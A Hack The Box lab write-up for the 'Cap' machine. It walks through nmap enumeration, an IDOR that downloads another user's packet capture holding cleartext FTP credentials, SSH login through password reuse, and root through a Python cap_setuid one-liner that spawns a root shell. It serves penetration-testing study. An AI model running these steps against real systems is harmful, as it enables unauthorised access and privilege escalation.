
# Cap

**Platform:** Hack The Box  
**OS:** Linux  
**Difficulty:** Easy  
**Status:** In Progress

---

## 1. Enumeration

### Nmap Scan

**Command:**
```bash
nmap -sC -sV -oN cap-nmap.txt 10.129.155.246
```

**Results:**

The target machine was reached and three open TCP Ports were found:
- `21/tcp` — FTP (vsftpd 3.0.3)
- `22/tcp` — SSH (OpenSSH 8.2p1, Ubuntu)
- `80/tcp` — HTTP (Gunicorn, Security Dashboard)

**Analysis:**

FTP could allow access to files on the target machine.
SSH may allow remote access to the target machine, if credentials are discovered.
The HTTP Service hosts a web application that is titled Security Dashboard.

## 2. Web Application Inspection

Inspected the HTML Source of the Security Dashboard and identified the following endpoints:
- `/` — Main dashboard.
- `/capture` — Security Snapshot (5 Second PCAP + Analysis).
- `/ip` — Network interface configuration.
- `/netstat` — Network connection information.

The application exposes network information through the web interface on the dashboard.

The /capture feature recorded 5 seconds of network traffic, stores its result as a packet capture, then redirects the user to /data/<id> where id is a numeric integer related to the user's current session. A download link then points to /download/<id>


## 3. Credential Discovery (IDOR)

**Vulnerability:** Insecure Direct Object Reference (IDOR).

The capture ID in `/data/<id>` and `/download/<id>` can be user controlled by editing the id argument. The server does not confirm that the requested capture belongs to the current user. Requesting ID `0` - the earliest capture, generated before the current session returned a capture containing 72 packets.

**Command:**
```bash
curl http://10.129.155.246/download/0 -o 0.pcap
tshark -r 0.pcap -Y ftp
```

The capture contained an FTP session in cleartext. The `USER` and `PASS` commands exposed valid credentials:

**Analysis:**

An unauthenticated user could use other users' captures by changing the ID. Capture `0` had recorded an administrative FTP login, and because FTP is unencrypted, the credentials were readable in plaintext.

## 4. Initial Access

The credentials were taken from FTP, but SSH was chosen as the target because it provides an interactive shell rather than file transfer only. The same password worked on SSH.

**Command:**
```bash
ssh nathan@10.129.155.246
cat user.txt
```

**Result:** User flag obtained. ✅

## 5. Privilege Escalation

**Vulnerability:** Dangerous Linux capability (`cap_setuid`) on the Python binary.

Enumerated file capabilities across the filesystem:

**Command:**
```bash
getcap -r / 2>/dev/null
```

**Result:**
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

The `cap_net_raw` capabilities on `ping`, `traceroute6` and `mtr-packet` are expected (raw socket access). However, `/usr/bin/python3.8` carries `cap_setuid`, which allows the binary to change its UID to any value — including 0 (root) - without a password or sudo.

**Exploit:**
```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

- `os.setuid(0)` uses the capability to set the process UID to root.
- `os.system("/bin/bash")` spawns a shell running as root.

**Command:**
```bash
whoami        # root
cat /root/root.txt
```

**Result:** Root flag obtained. ✅


## 7. Lessons Learned

- **IDOR:** never trust a client-supplied object ID; the server must enforce ownership/authorisation on every request. Sequential IDs make enumeration trivial.
- **Cleartext protocols:** FTP exposes credentials to anyone who can read the traffic. The capture tool effectively sniffed and stored a plaintext login, which the IDOR then made retrievable.
- **Password reuse:** the same password worked across FTP and SSH, turning a file-access leak into a full interactive shell.
- **Linux capabilities:** capabilities are a finer-grained alternative to setuid-root binaries, but a misassigned one (`cap_setuid` on an interpreter) is equivalent to handing out root. Always audit with `getcap -r /`.

## 7. Tools Used

- Nmap
- curl
- tshark / Wireshark
- ssh
- getcap

## 8. Attack Chain Summary

IDOR on `/download/<id>` → cleartext FTP credentials from PCAP → SSH access via password reuse (user flag) → `cap_setuid` on Python for privilege escalation (root flag).
